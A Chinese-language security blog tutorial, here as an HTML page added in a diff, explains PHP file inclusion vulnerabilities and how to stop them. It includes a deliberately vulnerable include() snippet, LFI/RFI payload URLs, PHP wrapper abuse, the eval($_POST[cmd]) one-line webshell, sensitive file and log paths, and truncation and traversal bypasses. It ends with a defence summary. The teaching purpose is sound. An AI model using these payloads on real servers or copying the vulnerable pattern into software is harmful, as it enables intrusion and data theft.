@@ -1,0 +1,271 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Web:文件包含漏洞 - H3ng</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="H3ng,"> 
+    <meta name="description" content="文件包含原理1.文件包含开发人员将相同的函数写入单独的文件中，需要使用某个函数时直接调用此文件，无需再次编写，这种文件调用的过程称文件包含
+2.文件包含漏洞开发人员为了使代码更灵活，会将被包含的文件,"> 
+    <meta name="author" content="H3ng"> 
+    <link rel="alternative" href="atom.xml" title="H3ng" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+<meta name="generator" content="Hexo 5.2.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">H3ng</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://LXH3ng.github.io"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">Web:文件包含漏洞</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">Web:文件包含漏洞</h1>
+        <div class="stuff">
+            <span>五月 24, 2021</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <h3 id="文件包含原理"><a href="#文件包含原理" class="headerlink" title="文件包含原理"></a>文件包含原理</h3><h4 id="1-文件包含"><a href="#1-文件包含" class="headerlink" title="1.文件包含"></a>1.文件包含</h4><p>开发人员将相同的函数写入单独的文件中，需要使用某个函数时直接调用此文件，无需再次编写，这种文件调用的过程称文件包含</p>
+<h4 id="2-文件包含漏洞"><a href="#2-文件包含漏洞" class="headerlink" title="2.文件包含漏洞"></a>2.文件包含漏洞</h4><p>开发人员为了使代码更灵活，会将被包含的文件设置为变量，用来进行动态调用，从而导致客户端可以恶意调用一个恶意文件，造成文件包含漏洞</p>
+<h3 id="文件包含分类"><a href="#文件包含分类" class="headerlink" title="文件包含分类"></a>文件包含分类</h3><h4 id="1-本地文件包含"><a href="#1-本地文件包含" class="headerlink" title="1.本地文件包含"></a>1.本地文件包含</h4><p>包含服务器本身存在的恶意文件<br>a.txt</p>
+<pre><code>&lt;?php phpinfo();?&gt;</code></pre>
+<p>b.php</p>
+<pre><code>&lt;?php
+$b=$_GET['id'];
+include($b);
+?&gt;</code></pre>
+<p>payload:</p>
+<pre><code>localhost/b.php?id=a.txt //返回phpinfo页面</code></pre>
+<p>注：<br>    1.两个文件在同一目录下（若不在同一目录这被包含的文件路径必须写绝对路径或相对路径）<br>    2.被包含的页面的后缀无论是什么都会当做PHP解析</p>
+<h4 id="2-远程文件包含"><a href="#2-远程文件包含" class="headerlink" title="2.远程文件包含"></a>2.远程文件包含</h4><p>包含其他网站上的恶意文件<br>远程文件包含利用条件：在php.ini中allow_url_fopen=on、allow_url_include=on</p>
+<p>payload：</p>
+<pre><code>localhost/b.php?id=http://ip/文件路径</code></pre>
+<p>​    1</p>
+<p>注：<br>    远程包含的文件路径必须是绝对路径</p>
+<h3 id="存在文件包含的脚本语言及应用函数"><a href="#存在文件包含的脚本语言及应用函数" class="headerlink" title="存在文件包含的脚本语言及应用函数"></a>存在文件包含的脚本语言及应用函数</h3><p>php</p>
+<pre><code>1.include():执行到include函数时才文件包含，找不到被包含的文件路径时，发出警告，脚本继续运行
+2.require():只要程序一运行就进行文件包含，找不到被包含的文件路径时，产生致命错误，脚本停止运行
+3.include_once()与require():与上述函数一样，只是若文件中代码已经被包含则不会再次包含</code></pre>
+<p>jsp/servlet</p>
+<pre><code>1.ava.io.file()
+2.java.io.filereader()</code></pre>
+<p>asp</p>
+<pre><code>1.include file
+2.include virtual</code></pre>
+<h3 id="各个协议实现命令执行"><a href="#各个协议实现命令执行" class="headerlink" title="各个协议实现命令执行"></a>各个协议实现命令执行</h3><p>%00截断</p>
+<pre><code>是否需要截断是根据包含函数后有没有对包含的文件进行拼接一个后缀，如果有就需要使用%00进行截断
+当php版本&lt;=5.2使用%00截断</code></pre>
+<p>file：//:用于访问本地文件系统</p>
+<pre><code>条件(php.ini)：
+    allow_url_fopen   off/on
+    allow_url_include off/on
+使用方法：file：//[文件的绝对路径和文件名]</code></pre>
+<p>php://:访问各个输入输出流</p>
+<pre><code> php：//filter：用于读取源码并进行bash64编码输出；
+    条件（php.ini）：
+        allow_url_fope   off/on
+        allow_url_include off/on
+    php：//input：可以访问请求的原始数据的只读流,将post请求中的数据作为PHP代码执行；
+    条件(php.ini)：
+        allow_url_fope   off/on
+        allow_url_include on
+    php://stdin是只读的，php://stdout 和 php://stderr 是只写的。
+    php://output 是一个只写的数据流， 允许你以 print 和 echo 一样的方式 写入到输出缓冲区。
+    php://fd 允许直接访问指定的文件描述符。</code></pre>
+<p>zip://,bzip://,zlib://：均属于压缩流，可以访问压缩文件中的子文件，不需要传后缀名</p>
+<pre><code>条件：
+    allow_url_fope   off/on
+    allow_url_include off/on
+zip://使用方法：
+    zip://[压缩文件绝对路径]#[压缩文件内的子文件名]
+bzip2://使用方法：
+    bzip2://file.bz2
+zlib://使用方法：
+    zlib://file.gz</code></pre>
+<p>data://</p>
+<pre><code>条件：
+    allow_url_fope   on
+    allow_url_include on</code></pre>
+<h3 id="直接执行代码的函数："><a href="#直接执行代码的函数：" class="headerlink" title="直接执行代码的函数："></a>直接执行代码的函数：</h3><p>Eval()、assert()、system()、exec()、shell_exec()、passthru()、</p>
+<p>Escapeshellcmd()、pcntl_exec()等就不一一举例了。</p>
+<p>1、eval()</p>
+<p>eval() 函数把字符串按照 PHP 代码来计算，如常见的一句话后门程序：<!--?php
+eval($_POST[cmd])?--></p>
+<p>2、assert() 与eval类似，字符串被 assert() 当做 PHP 代码来执行；</p>
+<p>PHP文件包含漏洞<br>开发人员都希望代码更加灵活，所以通常会将被包含的文件设置为变量，用来进行动态调用。正是这种灵活性，从而导致客户端可以调用一个恶意文件，造成文件包含漏洞。</p>
+<h3 id="常见的导致文件包含的函数："><a href="#常见的导致文件包含的函数：" class="headerlink" title="常见的导致文件包含的函数："></a>常见的导致文件包含的函数：</h3><p>PHP:include()、include_once()、require()、require_once()等；<br>1.php文件包含可以直接执行包含文件的代码，包含的文件格式不受任何限制<br>在 php 中提供了四个文件包含函数：<br>(1) Require: 找不到被包含的文件时会产生致命错误(E_COMPILE_ERROR)，并停止脚本；<br>(2) Include：找不到被包含的文件时只会产生一个(E_warinng)，脚本将继续执行；<br>(3) Require_once：与 include 类似会产生警告，区别是如果文件代码已经被包含，则不会再<br>次被包含；</p>
+<p>2、文件包含漏洞利用的前提条件：<br>（1）web 应用采用 include 等文件包含函数，并且需要包含的文件路径是通过用户传输参<br>数的方式引入；<br>（2）用户能够控制包含文件的参数，被包含的文件可被当前页面访问；</p>
+<p>3、文件包含获取 webshell 的条件：<br>（1）攻击者需要知道文件存放的物理路径；<br>（2）对上传文件所在目录拥有可执行权限；<br>（3）存在文件包含漏洞；</p>
+<p>4、典型特征<br>变量的值为一个页面：<br>?page=a.php<br>?home=b.html<br>?file=content…</p>
+<p>5、常见的敏感路径：<br>1 Windows<br>C:\boot.ini //查看系统版本<br>C:\windows\system32\inetsrv\MetaBase.xml //IIS 配置文件<br>C:\windows\repair\sam //存储 windows 系统初次安装的密码<br>C:\Program Files\mysql\my.ini //mysql 配置<br>C:\Program Files\mysql\data\mysql\user.MYD //Mysql root<br>C:\windows\php.ini //php 配置信息<br>C:\windows\my.ini //mysql 配置文件</p>
+<p>2 UNIX/Linux<br>/etc/passwd<br>/usr/local/app/apache2/conf/httpd.conf //apache2 默认配置文件<br>/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置<br>/usr/local/app/php5/lib/php.ini //PHP 相关配置<br>/etc/httpd/conf/httpd.conf //apache<br>/etc/php5/apache2/php.ini //ubuntu 系统的默认路径</p>
+<p>日志默认路径<br>(1) apache+Linux 日志默认路径<br>/etc/httpd/logs/access_log<br>或者<br>/var/log/httpd/access_log</p>
+<p>(2) apache+win2003 日志默认路径<br>D:\xampp\apache\logs\access.log<br>D:\xampp\apache\logs\error.log</p>
+<p>(3) IIS6.0+win2003 默认日志文件<br>C:\WINDOWS\system32\Logfiles</p>
+<p>(4) IIS7.0+win2003 默认日志文件<br>%SystemDrive%\inetpub\logs\LogFiles</p>
+<p>(5) nginx 日志文件<br>日志文件在用户安装目录 logs 目录下<br>以我的安装路径为例/usr/local/nginx,<br>那我的日志目录就是在/usr/local/nginx/logs里<br>web 中间件默认配置<br>(1) apache+linux 默认配置文件<br>/etc/httpd/conf/httpd.conf<br>或者<br>index.php?page=/etc/init.d/httpd<br>(2) IIS6.0+win2003 配置文件<br>C:/Windows/system32/inetsrv/metabase.xml<br>(3) IIS7.0+WIN 配置文件<br>C:\Windows\System32\inetsrv\config\applicationHost.config</p>
+<h3 id="常见的绕过与防御"><a href="#常见的绕过与防御" class="headerlink" title="常见的绕过与防御"></a>常见的绕过与防御</h3><h4 id="1-00截断（php-lt-5-3-4）"><a href="#1-00截断（php-lt-5-3-4）" class="headerlink" title="1.%00截断（php<5.3.4）"></a>1.%00截断（php&lt;5.3.4）</h4><pre><code>说明：
+    PHP内核是由C语言实现的，因此使用了C语言中的一些字符串处理函数。在连接字符串时，0字(x00)将作为字符串的结束符。所以在这个地方，攻击者只要在最后加入一个0字节，就能截断  file变量之后的字符串。
+防御：
+    禁用0字节</code></pre>
+<h4 id="2-超长字符截断"><a href="#2-超长字符截断" class="headerlink" title="2.超长字符截断"></a>2.超长字符截断</h4><pre><code>利用：
+    利用操作系统对目录最大长度的限制，可以不需要0字节而达到截断的目的。
+    我们知道目录字符串，在window下256字节、linux下4096字节时会达到最大值，最大值长度之后的字符将被丢弃。
+    而利用"./"的方式即可构造出超长目录字符串
+防御：
+    限制用户输入字符长度</code></pre>
+<h4 id="3-任意目录遍历"><a href="#3-任意目录遍历" class="headerlink" title="3.任意目录遍历"></a>3.任意目录遍历</h4><pre><code>利用：
+    使用"../../../"这样的方式来返回到上层目录中，这种方式又被称为"目录遍历(Path Traversal)"。常见的目录遍历漏洞，还可以通过不同的编码方式来绕过一些服务器端的防御逻辑(WAF)
+防御：
+    目录遍历漏洞是一种跨越目录读取文件的方法，但当PHP配置了open_basedir时，将很好地保护服务器，使得这种攻击无效。
+    open_basedir的作用是限制在某个特定目录下PHP能打开的文件(有点像chroot的感觉)</code></pre>
+<h4 id="4-问号截断"><a href="#4-问号截断" class="headerlink" title="4.问号截断"></a>4.问号截断</h4><pre><code>利用：
+    http://localhost/FIleInclude/index.php?path=http://localhost/test/solution.php?
+防御：
+    关闭远程文件包含的配置选项allow_url_include = Off</code></pre>
+<h3 id="防御总结"><a href="#防御总结" class="headerlink" title="防御总结"></a>防御总结</h3><pre><code>1.无需情况下设置allow_url_include和allow_url_fopen为关闭
+2.对可以包含的文件进行限制，可以使用白名单的方式，或者设置可以包含的目录，如open_basedir
+3.尽量不使用动态包含
+4.严格检查变量是否已经初始化。
+5.建议假定所有输入都是可疑的，尝试对所有输入提交可能可能包含的文件地址，包括服务器本地文件及远程文件，进行严格的检查，参数中不允许出现../之类的目录跳转符。
+6.严格检查include类的文件包含函数中的参数是否外界可控。
+7.不要仅仅在客户端做数据的验证与过滤，关键的过滤步骤在服务端进行。
+8.在发布应用程序之前测试所有已知的威胁。</code></pre>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='//music/1.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='false'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r=''
+        data-o=''
+        data-a=''
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+			<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%8E%9F%E7%90%86"><span class="toc-number">1.</span> <span class="toc-text">文件包含原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.1.</span> <span class="toc-text">1.文件包含</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.2.</span> <span class="toc-text">2.文件包含漏洞</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%88%86%E7%B1%BB"><span class="toc-number">2.</span> <span class="toc-text">文件包含分类</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">2.1.</span> <span class="toc-text">1.本地文件包含</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">2.2.</span> <span class="toc-text">2.远程文件包含</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80%E5%8F%8A%E5%BA%94%E7%94%A8%E5%87%BD%E6%95%B0"><span class="toc-number">3.</span> <span class="toc-text">存在文件包含的脚本语言及应用函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%84%E4%B8%AA%E5%8D%8F%E8%AE%AE%E5%AE%9E%E7%8E%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">4.</span> <span class="toc-text">各个协议实现命令执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B4%E6%8E%A5%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E7%9A%84%E5%87%BD%E6%95%B0%EF%BC%9A"><span class="toc-number">5.</span> <span class="toc-text">直接执行代码的函数：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E5%AF%BC%E8%87%B4%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E5%87%BD%E6%95%B0%EF%BC%9A"><span class="toc-number">6.</span> <span class="toc-text">常见的导致文件包含的函数：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E7%BB%95%E8%BF%87%E4%B8%8E%E9%98%B2%E5%BE%A1"><span class="toc-number">7.</span> <span class="toc-text">常见的绕过与防御</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-00%E6%88%AA%E6%96%AD%EF%BC%88php-lt-5-3-4%EF%BC%89"><span class="toc-number">7.1.</span> <span class="toc-text">1.%00截断（php&lt;5.3.4）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E8%B6%85%E9%95%BF%E5%AD%97%E7%AC%A6%E6%88%AA%E6%96%AD"><span class="toc-number">7.2.</span> <span class="toc-text">2.超长字符截断</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E4%BB%BB%E6%84%8F%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86"><span class="toc-number">7.3.</span> <span class="toc-text">3.任意目录遍历</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E9%97%AE%E5%8F%B7%E6%88%AA%E6%96%AD"><span class="toc-number">7.4.</span> <span class="toc-text">4.问号截断</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%80%BB%E7%BB%93"><span class="toc-number">8.</span> <span class="toc-text">防御总结</span></a></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7}});</script></body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
